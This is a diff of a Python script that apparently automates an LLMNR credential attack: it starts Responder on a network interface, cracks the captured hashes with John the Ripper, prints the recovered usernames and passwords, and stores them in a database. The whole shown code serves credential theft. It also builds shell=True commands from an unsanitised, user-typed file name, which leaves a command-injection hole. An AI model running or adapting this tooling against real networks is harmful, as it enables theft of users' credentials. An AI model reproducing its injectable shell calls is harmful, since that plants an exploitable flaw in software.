@@ -1907,7 +1907,7 @@ def start_listener():
     start_listener = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python2 Responder/Responder.py -I {}; exec bash"'.format(interface_name)])
 
 def crack_hash_generated():
-    hash_file = input("Input name of hash file: ")
+    hash_file = input("Input name of hash file inside Responder/logs folder: ")
     remove_pot_file = subprocess.call("rm /root/.john/john.pot", shell = True)
     crack_hash = subprocess.check_output("john Responder/logs/{}".format(hash_file), shell=True)
     show_hash = subprocess.check_output("john Responder/logs/{} --show".format(hash_file), shell=True)
@@ -1937,6 +1937,9 @@ def crack_hash_generated():
             break
     crack_usr = raw_output[posB+pos1:posB+pos2-1]
     crack_pwd = raw_output[posB+2:posB+pos1-1]
+    print("Username: ", crack_usr)
+    print("Password: ", crack_pwd)
+
     llist = [crack_usr, crack_pwd, crack_algo]
     cur.execute('''INSERT INTO ExpDB.LLMNR 
     (id, Username, Password, Algorithm) 
